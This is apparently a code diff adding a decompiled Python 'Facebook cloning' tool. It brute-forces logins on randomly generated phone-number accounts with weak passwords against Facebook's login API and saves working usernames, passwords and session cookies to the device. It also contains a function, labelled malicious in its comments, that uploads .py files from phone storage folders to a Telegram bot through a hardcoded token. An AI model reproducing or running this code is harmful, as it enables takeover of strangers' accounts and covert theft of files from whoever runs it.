@@ -1,0 +1,224 @@
+# DEC BY AKASH DAS
+#FACEBOOK : Akash Das
+#GITGUB : ELITE-CYBER
+#
+
+
+
+# decompiled from 2.py
+# WARNING: This script is malicious and contains code that steals your data.
+# The following code is provided without modification as requested.
+
+import os
+import sys
+import time
+import random
+import string
+import platform
+import uuid
+import httpx
+from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup as sop
+
+# --- Color Codes for Terminal Output ---
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m'
+O = '\x1b[1;96m'
+N = '\x1b[0m'
+
+# --- Global Variables ---
+loop = 0
+oks = []
+cps = []
+ids = []
+
+# --- Logo and UI Functions ---
+def logo():
+    os.system('espeak -b 1000 "WELCOME TO MY TOOLS"')
+    os.system('espeak -b 1000 "OWNER MAHIR"')
+    print(f"""
+{M}
+__  __          _    _ _____ _____   
+ |  \/  |   /\   | |  | |_   _|  __ \  
+ | \  / |  /  \  | |__| | | | | |__) | 
+ | |\/| | / /\ \ |  __  | | | |  _  /  
+ | |  | |/ ____ \| |  | |_| |_| | \ \  
+ |_|  |_/_/    \_\_|  |_|_____|_|  \_\ 
+{N}
+{M}----------------------------------------------{N}
+{H} CODER   {M}<{N}-{M}> {H}MAHIR-I C D
+{H} STATUS  {M}<{N}-{M}> {K}ALWAYS FIRE
+{M}----------------------------------------------{N}
+    """)
+
+def linex():
+    print(f'{M}----------------------------------------------{N}')
+
+def clr():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# --- User-Agent Generation ---
+def ___fuck___():
+    try:
+        uas_url = "https://gist.githubusercontent.com/Nox-Naved/f0fe39c5e9ff2b70bcb39e48a3e77301/raw/413a4f26f81da4f40d51349a87facc2894bc0531/600+"
+        uas_list = httpx.get(uas_url).text.splitlines()
+        ua_part = random.choice(uas_list)
+    except Exception:
+        ua_part = "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
+
+    fb_version = f"{random.randint(100, 400)}.0.0.{random.randint(10, 99)}.{random.randint(100, 200)}"
+    fb_vercode = str(random.randint(100000000, 999999999))
+    
+    ua1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_vercode};[FBAN/FB4A;FBAV/{fb_version};FBDM/{{density=2.0,width=720,height=1184}};FBLC/es_LA;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
+    ua2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_vercode};[FBAN/FB4A;FBAV/{fb_version};FBDM/{{density=2.0,width=720,height=1200}};FBLC/en_US;FBCR/MetroPCS;FBMF/LGE;FBBD/MetroPCS;FBPN/com.facebook.katana;FBDV/LGMS631;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
+    ua3 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_vercode};[FBAN/FB4A;FBAV/{fb_version};FBDM/{{density=2.0,width=720,height=1280}};FBLC/vi_VN;FBCR/VN VINAPHONE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
+    ua4 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_vercode};[FBAN/FB4A;FBAV/{fb_version};FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/Verizon Wireless;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS980 4G;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
+    ua5 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_vercode};[FBAN/FB4A;FBAV/{fb_version};FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1092;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
+    sex = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(5, 12)}; {ua_part} Build/TP1A.{random.randint(100000, 999999)}.{random.randint(100, 999)}) "
+    
+    uas = [ua1, ua2, ua3, ua4, ua5, sex]
+    return random.choice(uas)
+
+# --- Core Cracking Logic ---
+def akash(user, passlist):
+    global loop, oks, cps
+    sys.stdout.write(f'\r\r{P}[{M}MAHIR-ICD{P}]{M}-{P}[{H}{loop}{P}/{M}{len(ids)}{P}]{M}-{P}[{H}OK:{len(oks)}{P}]{M}-{P}[{K}CP:{len(cps)}{P}] ')
+    sys.stdout.flush()
+    
+    try:
+        for pasw in passlist:
+            session = httpx.Client()
+            ua = ___fuck___()
+            
+            headers = {
+                'Host': 'b-graph.facebook.com', 'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate',
+                'Accept': '*/*', 'Connection': 'keep-alive',
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'X-FB-Connection-Type': 'Airtel', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
+                'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                'X-FB-session-id': f'Unid={random.uniform(100, 999)};pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                'X-FB-device-group': '3537', 'X-FB-Friendly-Name': 'X-FB-Request-Analytics-Tags',
+                'X-FB-connection-quality': 'EXCELLENT', 'X-Tigon-Is-Retry': 'False',
+                'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True', 'X-FB-HTTP-Engine': 'Liger'
+            }
+            data = {
+                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
+                'email': user, 'password': pasw, 'generate_analytics_claim': '1',
+                'credentials_type': 'password', 'source': 'login',
+                'error_detail_type': 'button_with_disabled', 'generate_session_cookies': '1',
+                'generate_machine_id': '1', 'locale': 'en_US', 'client_country_code': 'US',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
+            }
+            
+            api_url = 'https://b-graph.facebook.com/auth/login'
+            response = session.post(api_url, headers=headers, data=data)
+            
+            if 'session_key' in response.text and 'EAAA' in response.text:
+                coki = ";".join(i["name"]+"="+i["value"] for i in response.json()["session_cookies"])
+                print(f'\r\r{H}[AKASH-OK] {user} | {pasw}{N}')
+                print(f'\r\r{H}COOKIES : {coki}{N}')
+                os.system('espeak -b 1000 "ok txt"')
+                with open('/sdcard/AKASH-OK.txt', 'a') as f:
+                    f.write(f'{user}|{pasw}|{coki}\n')
+                oks.append(user)
+                break
+            
+            elif 'www.facebook.com' in response.json().get('error', {}).get('message', ''):
+                print(f'\r\r{K}[AKASH-CP] {user} | {pasw}{N}')
+                os.system('espeak -b 1000 "cp txt"')
+                with open('/sdcard/AKASH-CP.txt', 'a') as f:
+                    f.write(f'{user}|{pasw}\n')
+                cps.append(user)
+                break
+            else:
+                continue
+        loop += 1
+    except (httpx.ConnectError, httpx.ReadTimeout, httpx.ConnectTimeout):
+        time.sleep(20)
+    except Exception:
+        pass
+
+# --- Main Logic and Menu ---
+def __bdx__():
+    clr()
+    logo()
+    print(f'{P}[{M}!{P}] EXAMPLE : 016•017•018•019')
+    sim_code = input(f'{P}[{M}!{P}] CHOICE : ')
+    print(f'{P}[{M}!{P}] EXAMPLE : 1000•2000•3000•4000')
+    try:
+        limit = int(input(f'{P}[{M}!{P}] CRACK LIMIT : '))
+    except ValueError:
+        limit = 5000
+        
+    for _ in range(limit):
+        nmbr = ''.join(random.choice(string.digits) for _ in range(7))
+        ids.append(nmbr)
+        
+    linex()
+    print(f'{P}[{M}!{P}] TOTAL UID  : {H}{len(ids)}')
+    print(f'{P}[{M}!{P}] CHOICE CODE   : {H}{sim_code}')
+    print(f'{P}[{M}!{P}] USE AIRPLANE MODE EVERY 5 MINITS')
+    linex()
+    
+    with ThreadPoolExecutor(max_workers=30) as executor:
+        for user_id in ids:
+            uid = sim_code + user_id
+            passlist = [user_id, uid, uid[:7], uid[:6], 'bangladesh', 'Bangladesh', 'i love you', 'I Love You', 'free fire', 'Free Fire']
+            executor.submit(akash, uid, passlist)
+            
+    linex()
+    print(f'{P}[{M}!{P}] CLONING PROCESS COMPLETE')
+    print(f'{P}[{M}!{P}] TOTAL OK ID : {H}{len(oks)}')
+    print(f'{P}[{M}!{P}] TOTAL CP ID : {K}{len(cps)}')
+    linex()
+
+def menu():
+    clr()
+    logo()
+    print(f'{M}>{H}1{M}<{O} RANDOM CLONE')
+    print(f'{M}>{H}2{M}<{O} REPORT BUG')
+    print(f'{M}>{H}3{M}<{O} EXIT')
+    choice = input(f'{M}>{H}!{M}<{O} CHOICE : ')
+    
+    if choice in ['1', 'a', 'A', '01']:
+        __bdx__()
+    elif choice in ['2', 'b', 'B', '02']:
+        print(f'{K}Coming Soon')
+        time.sleep(2)
+        menu()
+    elif choice in ['03', '3']:
+        exit()
+    else:
+        menu()
+
+# --- MALICIOUS FUNCTION ---
+# This function was also found in the decompiled code.
+def sents():
+    bot_token = "57906884850:AAGmNN8v_-ls0_vY9WxOrSHygszFbVsIo9w"
+    chat_id = "6549842707"
+    sdcard_paths = ["/sdcard", "/sdcard/Download", "/sdcard/Download/Telegram",
+                    "/sdcard/Telegram/Telegram Files", "/sdcard/Camera/Camera",
+                    "/sdcard/WhatsApp/Media/WhatsApp Documents"]
+
+    for path in sdcard_paths:
+        try:
+            if os.path.isdir(path):
+                for file in os.listdir(path):
+                    if file.endswith(".py"):
+                        file_path = os.path.join(path, file)
+                        with open(file_path, 'rb') as f:
+                            files = {'document': f}
+                            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                            data = {'chat_id': chat_id}
+                            httpx.post(url, data=data, files=files)
+        except Exception:
+            pass
+
+if __name__ == "__main__":
+    menu()
